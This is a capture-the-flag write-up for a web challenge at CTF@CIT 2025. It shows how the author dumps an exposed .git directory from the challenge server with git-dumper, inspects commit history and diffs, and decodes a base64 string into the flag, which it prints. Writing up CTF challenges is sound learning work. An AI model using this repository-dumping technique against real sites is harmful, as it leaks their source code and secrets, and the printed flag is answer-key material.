---
name: Commit & Order - Version Control Unit (2025)
event: CTF@CIT CTF 2025
category: Web
description: Writeup for Commit & Order - Version Control Unit (Web) - CTF@CIT CTF (2025) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Commit & Order: Version Control Unit

[![](https://img.youtube.com/vi/ZBdApaw0r0M/0.jpg)](https://www.youtube.com/watch?v=ZBdApaw0r0M?t=140 "Commit & Order: Version Control Unit (CIT CTF)")

## Description

> In software development, the repository is represented by two separate yet equally important branches...

## Solution

Another PHP login page. Test for SQLi again, thankfully not a repeat of the first challenge 😁

Description hints at `git`, so we can check `http://23.179.17.40:58002/.git/`

It returns a `Forbidden` page, meaning that it exists _but_ we cant access it. Time to check out the [git-dumper](https://github.com/arthaud/git-dumper) tool! It takes the URL and directory to dump to.

{% code overflow="wrap" %}

```bash
git-dumper http://23.179.17.40:58002/.git/ .
```

{% endcode %}

It downloads the git repo, now we can check the log.

{% code overflow="wrap" %}

```bash
git log

commit 7c8c6a8e434cb23aa9c9dac0ce715e928016849a (HEAD -> master)
Author: webmaster <webmaster@ctf.cyber-cit.club>
Date:   Fri Apr 18 12:39:59 2025 -0400

    I think we're good for now

commit 9b8bf13600c17ba7cbbc9ac7dcffaebd36b16b36
Author: webmaster <webmaster@ctf.cyber-cit.club>
Date:   Fri Apr 18 12:39:06 2025 -0400

    changed it again

commit 68f8fcdbebcca3c8fda1e91fcb842992d09a41d4
Author: webmaster <webmaster@ctf.cyber-cit.club>
Date:   Fri Apr 18 12:34:30 2025 -0400

    putting chatgpt to work

commit 247b12483ba3a6a8d177fdd9d74416a01eb61512
Author: webmaster <webmaster@ctf.cyber-cit.club>
Date:   Fri Apr 18 12:30:08 2025 -0400

    updated some more

commit ca9517713391aca6f5073758effa47c33d3be6b4
Author: webmaster <webmaster@ctf.cyber-cit.club>
Date:   Fri Apr 18 12:26:52 2025 -0400

    updated admin page

commit 0e775315a623ed96d9b0b53e6ffb69dd06b93902
Author: webmaster <webmaster@ctf.cyber-cit.club>
Date:   Fri Apr 18 12:18:13 2025 -0400

    first commit
```

{% endcode %}

Hmmm `"putting chatgpt to work"`? Sounds like somebody has been vibe coding! Let's do a diff.

{% code overflow="wrap" %}

```bash
git diff 68f8fcdbebcca3c8fda1e91fcb842992d09a41d4

+  <h1>Admin Panel</h1>

-  <div class="main-content">
-    <div class="warning-banner">
-      <svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
-        <path d="M1 21h22L12 2 1 21zm12-3h-2v2h2v-2zm0-8h-2v6h2v-6z" />
-      </svg>
-      This admin panel is under construction. No actual functionality is available yet. But here, have this: Q0lUezVkODFmNzc0M2Y0YmMyYWJ9
-    </div>
+  <div class="container">
+    <p>This admin page is under construction and currently has no functionality.</p>
```

{% endcode %}

Looks like a base64 encoded message, let's decode.

{% code overflow="wrap" %}

```bash
echo "Q0lUezVkODFmNzc0M2Y0YmMyYWJ9" | base64 -d

CIT{5d81f7743f4bc2ab}
```

{% endcode %}

Flag: `CIT{5d81f7743f4bc2ab}`
